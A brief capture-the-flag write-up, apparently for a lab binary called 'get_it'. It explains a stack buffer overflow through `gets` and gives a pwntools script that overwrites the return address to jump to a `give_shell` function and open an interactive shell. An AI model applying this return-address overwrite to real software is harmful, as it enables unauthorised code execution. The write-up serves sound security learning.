# Application

![image](https://user-images.githubusercontent.com/115867891/206291126-ec97420d-621d-4cac-85b6-32ff7d6755b8.png)

# Dissasembly

Easy. What we see is `gets` at `[rbp-20h]`. Therefore, 0x28 bytes to return address. We have `give_shell` function that ... gives a shell.

![image](https://user-images.githubusercontent.com/115867891/206291363-87050f22-c7cf-4a93-815a-65980e2c625c.png)

![image](https://user-images.githubusercontent.com/115867891/206291390-84c7a42c-c5eb-4c87-9f87-db4561e4d06d.png)

# Exploit

```
from pwn import *

elf = ELF('./get_it')

addr_shell = elf.symbols['give_shell']
print(hex(addr_shell))

proc = process('./get_it')

payload = b'A' * 0x28 + p64(addr_shell)
proc.send(payload)
proc.interactive()
```

![image](https://user-images.githubusercontent.com/115867891/206291518-d756ccbd-f5f7-4f2f-8516-473c61a07604.png)
